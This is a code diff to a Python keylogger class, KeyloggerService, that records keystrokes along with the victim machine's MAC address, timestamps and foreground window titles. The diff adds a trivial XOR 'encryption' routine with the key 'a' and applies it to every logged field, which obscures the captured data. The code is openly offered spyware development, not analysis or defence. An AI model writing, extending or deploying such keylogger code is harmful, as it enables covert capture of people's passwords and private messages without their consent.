@@ -7,6 +7,15 @@ from getmac import get_mac_address
 import win32gui
 from PIL import ImageGrab
 
+class Encryptor:
+    @staticmethod
+    def xor_encryption(text):
+        key = "a"
+        encrypted_text = ""
+        for i in range(len(text)):
+            encrypted_text += chr(ord(text[i]) ^ ord(key[i % len(key)]))
+        return encrypted_text
+
 
 class KeyloggerService:
     def __init__(self):
@@ -47,19 +56,22 @@ class KeyloggerService:
             self.prev_up = self.current_app
 
     def __add_to_data(self, dictionary: dict, data: str):
-        current_time = self.__current_time()
-        current_mac_address = get_mac_address()
+        current_time = Encryptor.xor_encryption(self.__current_time())
+        current_mac_address = Encryptor.xor_encryption(get_mac_address())
         current_app_1 = win32gui.GetForegroundWindow()
-        current_app = win32gui.GetWindowText(current_app_1)
+        current_app =Encryptor.xor_encryption( win32gui.GetWindowText(current_app_1))
         self.current_app = rf"{current_app}"
 
         if not dictionary.get(current_mac_address):
             dictionary[current_mac_address] = {}
+
         if not dictionary[current_mac_address].get(current_time):
             dictionary[current_mac_address][current_time] = {}
+
         if not dictionary[current_mac_address][current_time].get(self.current_app):
             dictionary[current_mac_address][current_time][self.current_app] = []
-        dictionary[current_mac_address][current_time][self.current_app].append(data)
+
+        dictionary[current_mac_address][current_time][self.current_app].append(Encryptor.xor_encryption(data))
 
     def start(self):
         self.__change_action()
@@ -112,26 +124,13 @@ A.main()
 
 
 
-class Encryptor:
-    @staticmethod
-    def xor_encryption(text, key):
-        encrypted_text = ""
-        for i in range(len(text)):
-            encrypted_text += chr(ord(text[i]) ^ ord(key[i % len(key)]))
-        return encrypted_text
-
-
 
 
 def xor_encryption(text, key):
-    # Initialize an empty string for encrypted text
     encrypted_text = ""
-
-    # Iterate over each character in the text
     for i in range(len(text)):
         encrypted_text += chr(ord(text[i]) ^ ord(key[i % len(key)]))
 
-    # Return the encrypted text
     return encrypted_text
 
 
